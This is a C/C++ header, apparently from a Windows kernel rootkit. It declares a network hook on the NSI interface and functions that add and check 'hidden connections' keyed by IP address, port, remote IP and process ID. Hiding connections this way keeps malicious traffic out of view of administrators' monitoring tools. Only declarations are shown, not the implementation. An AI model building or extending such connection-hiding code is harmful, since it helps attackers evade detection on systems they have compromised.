#pragma once
#include "Ip2string.h"
#include "NetNSIHook.h"

#ifndef TAG_NET
#define TAG_NET 'TNET' 
#endif // !TAG_NET

extern char* GetProcessNameFromPid(HANDLE pid);
namespace NetHook
{
	typedef struct _NETHOOK_HIDDEN_CONNECTION {
		ULONG IpAddress;
		USHORT Port;
		ULONG RemoteIpAddress;
		ULONG ConnectPID;
		UNICODE_STRING ConnectProcess;
		USHORT _Unknown;    // For Future Use
	} NETHOOK_HIDDEN_CONNECTION, * PNETHOOK_HIDDEN_CONNECTION;


	typedef struct _NET_CONNECTION_ENTRY* PNET_CONNECTION_ENTRY;

	typedef struct _NET_CONNECTION_ENTRY {
		PNETHOOK_HIDDEN_CONNECTION Connection;
		PNET_CONNECTION_ENTRY NextEntry;
	} NET_CONNECTION_ENTRY, * PNET_CONNECTION_ENTRY;

	NTSTATUS InitNetworkHook();

	NTSTATUS NetAddHiddenConnection(_In_ const PNETHOOK_HIDDEN_CONNECTION NewConnection);

	VOID UnHookNetworkProxy();

	BOOLEAN NetIsHiddenIpAddress(_In_ const ULONG IpAddress, 
		_In_ const USHORT PortNumber, 
		_In_ const ULONG RemoteIpAddress, 
		_In_ const ULONG ConnectPID);
}

